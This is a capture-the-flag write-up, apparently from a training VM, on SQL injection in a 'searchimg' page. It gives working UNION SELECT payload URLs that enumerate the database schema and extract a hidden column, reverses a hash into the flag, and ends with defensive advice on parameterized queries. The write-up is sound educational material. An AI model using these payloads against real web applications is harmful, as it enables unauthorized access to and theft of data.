# Write-Up: SQL Injection Exploit

## Exploit Overview

This write-up details the steps taken to exploit an SQL injection vulnerability. The target is a web application that allows for unsafe SQL queries through a `searchimg` page. By leveraging `UNION SELECT` statements, we enumerate database schema, identify specific columns, and extract sensitive information to obtain the flag.

---

### Step 1: Enumerate Tables

Using the `information_schema.tables` view, we enumerate the tables in the active database schema.

#### Payload

```
http://192.168.1.33/?page=searchimg&id=5%20UNION%20SELECT%201,table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20&Submit=Submit#
```

#### Results

| ID | Title        | URL                           |
| -- | ------------ | ----------------------------- |
| 5  | Hack me ?    | borntosec.ddns.net/images.png |
| 5  | list\_images | 1                             |

---

### Step 2: Enumerate Columns

We focus on the `list_images` table and enumerate its columns using `information_schema.columns`.

#### Payload

```
http://192.168.1.33/index.php?page=searchimg&id=5%20UNION%20SELECT%20column_name,%20table_name%20FROM%20information_schema.columns%20--%20&Submit=Submit#
```

#### Results

| ID | Title        | URL     |
| -- | ------------ | ------- |
| 5  | list\_images | id      |
| 5  | list\_images | url     |
| 5  | list\_images | title   |
| 5  | list\_images | comment |

---

### Step 3: Extract Data from `comment` Column

We query the `list_images` table to extract the contents of the `comment` column, which does not display by default.

#### Payload

```
http://192.168.1.33/?page=searchimg&id=5%20UNION%20SELECT%20id,%20comment%20FROM%20list_images%20WHERE%20id=5%20--%20&Submit=Submit#
```

#### Results

| ID | Title                                                                              | URL                              |
| -- | ---------------------------------------------------------------------------------- | -------------------------------- |
| 5  | Hack me ?                                                                          | borntosec.ddns.net/images.png    |
| 5  | If you read this just use this md5 decode lowercase then sha256 to win this flag ! | 1928e8083cf461a51303633093573c46 |

---

### Step 4: Decode and Encrypt

#### Decode the MD5 Hash

The hash `1928e8083cf461a51303633093573c46` is decoded using [hashes.com](https://hashes.com/en/decrypt/hash):

- **Decoded Result:** `albatroz`

#### Encrypt in SHA-256

The decoded string `albatroz` is then encrypted into SHA-256 using [sha256.fr](https://www.sha256.fr/):

- **SHA-256 Hash:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

## Final Flag

The resulting SHA-256 hash `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188` is the flag.

---

## How to Protect Against SQL Injection

To protect against SQL injection attacks, implement the following measures:

1. **Parameterized Queries:**

   - Use prepared statements with parameterized queries to prevent direct execution of user inputs.
   - Example in PHP using PDO:
     ```php
     $stmt = $pdo->prepare('SELECT * FROM list_images WHERE id = :id');
     $stmt->execute(['id' => $userInput]);
     ```

2. **Input Validation:**

   - Validate all user inputs to ensure they conform to expected formats (e.g., integers for IDs).

3. **Escaping Special Characters:**

   - Escape user inputs when constructing SQL queries to neutralize special characters like quotes and semicolons.



By implementing these practices, web applications can significantly reduce the risk of SQL injection attacks.

---

## Summary

Through SQL injection, we successfully enumerated tables and columns, extracted sensitive data, and completed the challenge by decoding and re-encrypting a hash to retrieve the flag. This highlights the importance of sanitizing user input and implementing parameterized queries to prevent SQL injection vulnerabilities.

